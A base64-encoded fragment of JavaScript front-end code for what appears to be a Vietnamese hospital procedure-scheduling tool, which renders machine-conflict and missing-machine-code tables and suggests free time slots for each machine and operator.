QogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2NvbmZsaWN0LmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSDihpIgJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCgkJCQk8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtwcm9jLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSIgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiIgaWQ9Im1hY2hpbmVTdWdnZXN0aW9uLSR7Y29uZmxpY3QubWFjaGluZUNvZGV9LSR7Y29uZmxpY3QuZGF0ZX0iPg0KICAgICAgICAgICAgICAgICAgICA8IS0tIEfhu6NpIMO9IGdp4budIHPhur0gxJHGsOG7o2MgY+G6rXAgbmjhuq10IHNhdSAtLT4NCiAgICAgICAgICAgICAgICA8L3RkPmAgOiAnJ30gICAgICAgICAgDQoNCg0KCQkgIDwvdHI+YDsNCiAgICAgICAgfSk7DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iJHtzaG93RG9jdG9yID8gJzcnIDogJzYnfSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogDQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iNSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCg0KLy8vR+G7o2kgw70gZ2nhu50geHVuZyDEkeG7mXQgbcOheS8vLy8vDQovLyBIw6BtIHThuqFvIGfhu6NpIMO9IGdp4budIGNobyB4dW5nIMSR4buZdCBtw6F5DQpmdW5jdGlvbiBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXM7DQogICAgICAgIGNvbnN0IG1hY2hpbmVDb2RlID0gY29uZmxpY3QubWFjaGluZUNvZGU7DQogICAgICAgIGNvbnN0IGRhdGUgPSBjb25mbGljdC5kYXRlOw0KICAgICAgICANCiAgICAgICAgLy8gTOG6pXkgdOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGPDuW5nIG5nw6B5LCBjw7luZyBtw6F5DQogICAgICAgIGNvbnN0IHNhbWVNYWNoaW5lUHJvY2VkdXJlcyA9IGdldEFsbFByb2NlZHVyZXNGb3JNYWNoaW5lKG1hY2hpbmVDb2RlLCBkYXRlKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZyBjaG8gdOG7q25nIHRo4bunIHRodeG6rXQgdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgcHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3QgZHVyYXRpb25TZWNvbmRzID0gcHJvYy5lbmQgLSBwcm9jLnN0YXJ0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBzw6FuZw0KICAgICAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cygNCiAgICAgICAgICAgICAgICBzdGFydEhvdXIgKiAzNjAwLCANCiAgICAgICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgICAgICBzYW1lTWFjaGluZVByb2NlZHVyZXMsDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlcywgLy8gbG/huqFpIHRy4burIGPDoWMgdGjhu6cgdGh14bqtdCDEkWFuZyB4dW5nIMSR4buZdA0KICAgICAgICAgICAgICAgIG1heE1vcm5pbmcsDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvciwNCiAgICAgICAgICAgICAgICBkYXRlDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBjaGnhu4F1DQogICAgICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVNYWNoaW5lU2xvdHMoDQogICAgICAgICAgICAgICAgMTMuNSAqIDM2MDAsIA0KICAgICAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgICAgICBzYW1lTWFjaGluZVByb2NlZHVyZXMsDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBtYXhBZnRlcm5vb24sDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvciwNCiAgICAgICAgICAgICAgICBkYXRlDQogICAgICAgICAgICApOw0KDQogICAgICAgICAgICAvLyBGb3JtYXQga+G6v3QgcXXhuqMNCiAgICAgICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICAgICAgaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5Tw6FuZzo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoYWZ0ZXJub29uU2xvdHMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgICAgICBhZnRlcm5vb25TbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gTMawdSBn4bujaSDDvQ0KICAgICAgICAgICAgcHJvYy5tYWNoaW5lU3VnZ2VzdGlvbiA9IHN1Z2dlc3Rpb25zLmxlbmd0aCA+IDAgPyBzdWdnZXN0aW9ucy5qb2luKCc8YnI+JykgOiANCiAgICAgICAgICAgICAgICAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KICAgICAgICB9KTsNCg0KICAgICAgICAvLyBD4bqtcCBuaOG6rXQgVUkNCiAgICAgICAgdXBkYXRlTWFjaGluZVN1Z2dlc3Rpb25VSShtYWNoaW5lQ29kZSwgZGF0ZSwgcHJvY2VkdXJlcyk7DQogICAgfSk7DQp9DQoNCi8vIEjDoG0gbOG6pXkgdOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGPDuW5nIG3DoXksIGPDuW5nIG5nw6B5DQpmdW5jdGlvbiBnZXRBbGxQcm9jZWR1cmVzRm9yTWFjaGluZShtYWNoaW5lQ29kZSwgZGF0ZSkgew0KICAgIGNvbnN0IGFsbFByb2NzID0gW107DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICBpZiAoY29uZmxpY3QubWFjaGluZUNvZGUgPT09IG1hY2hpbmVDb2RlICYmIGNvbmZsaWN0LmRhdGUgPT09IGRhdGUpIHsNCiAgICAgICAgICAgIGFsbFByb2NzLnB1c2goLi4uY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIFRow6ptIGPDoWMgdGjhu6cgdGh14bqtdCBraMO0bmcgeHVuZyDEkeG7mXQgbmjGsG5nIGPDuW5nIG3DoXksIG5nw6B5DQogICAgaWYgKHdpbmRvdy5hbGxQcm9jZWR1cmVzKSB7DQogICAgICAgIHdpbmRvdy5hbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICBpZiAocHJvYy5tYWNoaW5lQ29kZSA9PT0gbWFjaGluZUNvZGUgJiYgcHJvYy5kYXRlID09PSBkYXRlKSB7DQogICAgICAgICAgICAgICAgYWxsUHJvY3MucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBhbGxQcm9jczsNCn0NCg0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcgY2hvIG3DoXkNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVNYWNoaW5lU2xvdHMoc3RhcnRUaW1lLCBlbmRUaW1lLCBkdXJhdGlvbiwgbWFjaGluZVByb2NlZHVyZXMsIGNvbmZsaWN0UHJvY2VkdXJlcywgbWF4U2xvdHMsIG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc01hY2hpbmVUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZWR1cmVzLCBvcGVyYXRvciwgZGF0ZSkpIHsNCiAgICAgICAgICAgIHNsb3RzLnB1c2goew0KICAgICAgICAgICAgICAgIHN0YXJ0OiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lKSwNCiAgICAgICAgICAgICAgICBlbmQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUgKyBkdXJhdGlvbikNCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQogICAgICAgIGN1cnJlbnRUaW1lICs9IDE1ICogNjA7IC8vIEtp4buDbSB0cmEgbeG7l2kgMTUgcGjDunQNCiAgICB9DQogICAgDQogICAgcmV0dXJuIHNsb3RzOw0KfQ0KDQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4gY2hvIG3DoXkNCmZ1bmN0aW9uIGhhc01hY2hpbmVUaW1lQ29uZmxpY3Qoc3RhcnRUaW1lLCBkdXJhdGlvbiwgbWFjaGluZVByb2NlZHVyZXMsIGNvbmZsaWN0UHJvY2VkdXJlcywgb3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCBtw6F5DQogICAgZm9yIChjb25zdCBwcm9jIG9mIG1hY2hpbmVQcm9jZWR1cmVzKSB7DQogICAgICAgIGlmIChwcm9jLnN0YXJ0IDwgZW5kVGltZSAmJiBwcm9jLmVuZCA+IHN0YXJ0VGltZSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQogICAgaWYgKHdpbmRvdy5hbGxQcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IG9wZXJhdG9yUHJvY2VkdXJlcyA9IHdpbmRvdy5hbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gb3BlcmF0b3IgJiYgDQogICAgICAgICAgICBwLmRhdGUgPT09IGRhdGUgJiYNCiAgICAgICAgICAgICFjb25mbGljdFByb2NlZHVyZXMuaW5jbHVkZXMocCkNCiAgICAgICAgKTsNCiAgICAgICAgDQogICAgICAgIGZvciAoY29uc3QgcHJvYyBvZiBvcGVyYXRvclByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgICAgICBjb25zdCBwcm9jRW5kID0gcHJvYy5lbmQgKyAocHJvYy5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgICAgIChlbmRUaW1lID4gcHJvY1N0YXJ0ICYmIGVuZFRpbWUgPD0gcHJvY0VuZCkgfHwNCiAgICAgICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovLyBIw6BtIGPhuq1wIG5o4bqtdCBVSSBn4bujaSDDvQ0KLy8gSMOgbSBj4bqtcCBuaOG6rXQgVUkgZ+G7o2kgw70NCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVTdWdnZXN0aW9uVUkobWFjaGluZUNvZGUsIGRhdGUsIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBzdWdnZXN0aW9uQ2VsbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGBtYWNoaW5lU3VnZ2VzdGlvbi0ke21hY2hpbmVDb2RlfS0ke2RhdGV9YCk7DQogICAgaWYgKHN1Z2dlc3Rpb25DZWxsKSB7DQogICAgICAgIC8vIEzhuqV5IGfhu6NpIMO9IHThu6sgdGjhu6cgdGh14bqtdCDEkeG6p3UgdGnDqm4gKHbDrCB04bqldCBj4bqjIMSR4buBdSBnaeG7kW5nIG5oYXUpDQogICAgICAgIGNvbnN0IGZpcnN0UHJvYyA9IHByb2NlZHVyZXNbMF07DQogICAgICAgIGlmIChmaXJzdFByb2MgJiYgZmlyc3RQcm9jLm1hY2hpbmVTdWdnZXN0aW9uKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9uQ2VsbC5pbm5lckhUTUwgPSBmaXJzdFByb2MubWFjaGluZVN1Z2dlc3Rpb247DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBzdWdnZXN0aW9uQ2VsbC5pbm5lckhUTUwgPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCg0KDQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5DQpmdW5jdGlvbiBkaXNwbGF5TWlzc2luZ01hY2hpbmVFcnJvcnMoKSB7DQogICAgY29uc3QgbWlzc2luZ01hY2hpbmVMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVMb2cnKTsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZVNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVTZWN0aW9uJyk7DQogICAgaWYgKG1pc3NpbmdNYWNoaW5lTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBxdcOqbiBn4bqvbiBtw6MgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgbWlzc2luZ01hY2hpbmVTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWlzc2luZ01hY2hpbmVMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgICBtaXNzaW5nTWFjaGluZVNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlcigpOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIHF1w6puIGfhuq9uIG3DoyBtw6F5DQpmdW5jdGlvbiB1cGRhdGVNaXNzaW5nTWFjaGluZU9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1pc3NpbmdNYWNoaW5lTG9nLm1hcChlcnJvciA9PiBlcnJvci5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Jyk7DQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBM4buNYyBxdcOqbiBn4bqvbiBtw6MgbcOheSB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlck1pc3NpbmdNYWNoaW5lQnlPcGVyYXRvcigpIHsNCiAgICBjb25zdCBvcGVyYXRvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWlzc2luZ01hY2hpbmVMb2cgDQogICAgICAgIDogbWlzc2luZ01hY2hpbmVMb2cuZmlsdGVyKGVycm9yID0+IGVycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSk7DQogICAgDQogICAgZGlzcGxheUZpbHRlcmVkTWlzc2luZ01hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWlzc2luZ01hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZUxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZUxvZycpOw0KICAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQoJCQkJPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICANCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCgkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgDQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQoNCi8vL2jDoG0gaGnhu4NuIHRo4buLIG5nw6B5IHRo4buxYyBoaeG7h24ga2jDoWMgLy8vDQovLyBIw6BtIGhp4buDbiB0aOG7iyBs4buXaSBkYXRlIG1pc21hdGNoDQpmdW5jdGlvbiBkaXNwbGF5RGF0ZU1pc21hdGNoRXJyb3JzKCkgew0KICAgIGNvbnN0IGRhdGVNaXNtYXRjaExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hMb2cnKTsNCiAgICBjb25zdCBkYXRlTWlzbWF0Y2hTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaFNlY3Rpb24nKTsNCiAgICANCiA